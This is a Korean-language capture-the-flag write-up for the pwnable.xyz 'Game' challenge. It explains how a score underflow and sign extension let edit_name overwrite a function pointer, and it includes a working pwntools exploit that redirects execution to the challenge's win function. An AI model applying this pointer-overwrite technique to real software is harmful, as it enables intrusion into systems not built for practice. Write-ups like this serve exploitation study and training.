# [pwnable.xyz] Game

> Tired of math already? Try getting the highest score possible.

## Bug

![image](https://github.com/user-attachments/assets/0bfb271f-f583-4412-9303-2e2e32a7f6ab)

![image](https://github.com/user-attachments/assets/2a126ec8-8cc1-412e-a694-b51edae7a45f)

정답을 맞추지 못하면 `cur->score`가 1 감소한다.

![image](https://github.com/user-attachments/assets/8ddef47b-5735-4f54-8963-02bda9156a27)

만약 `cur->score`가 0이었다면 메모리 상에서 `0xffff`가 된다.

![image](https://github.com/user-attachments/assets/dcaf3441-d857-4d3b-96e6-740eaf7a6428)

`save_game()`에서 `score`를 저장할 때 `unsigned short`인 `cur->score`를 8바이트로 캐스팅하는데,

![image](https://github.com/user-attachments/assets/019f9085-bb91-4b02-bdc6-518252820672)

이때 signed extension이 진행되어,

![image](https://github.com/user-attachments/assets/f2d1f88e-66d4-49ac-a7f3-a21c5e5f3b50)

메모리 상에 `0xffffffffffffffff`로 저장된다.

![image](https://github.com/user-attachments/assets/5f2e6454-168b-4fcb-9eff-dc28d00377bb)

`edit_name()`에서 `strlen(cur)`만큼 `read()`로 입력을 받는데, `score` 필드에 null byte가 없기 때문에 `play` 함수 포인터를 임의의 3바이트 값으로 덮어쓸 수 있다.

## Exploit

```python
from pwn import *

r = remote("svc.pwnable.xyz", 30009)

sla = r.sendlineafter
sa = r.sendafter


def play_game(answer=None):
    sla(b"> ", b"1")
    if answer is not None:
        sla(b"= ", str(answer).encode())


def save_game():
    sla(b"> ", b"2")


def edit_name(name):
    sla(b"> ", b"3")
    r.send(name)


win = 0x4009D6

sa(b"Name: ", b"a" * 16)

play_game(0)
save_game()
edit_name(b"a" * 0x18 + p64(win)[:3])
play_game()  # call win()

r.interactive()
```

![image](https://github.com/user-attachments/assets/fd25506c-c742-4277-b41f-33abe1b15d62)
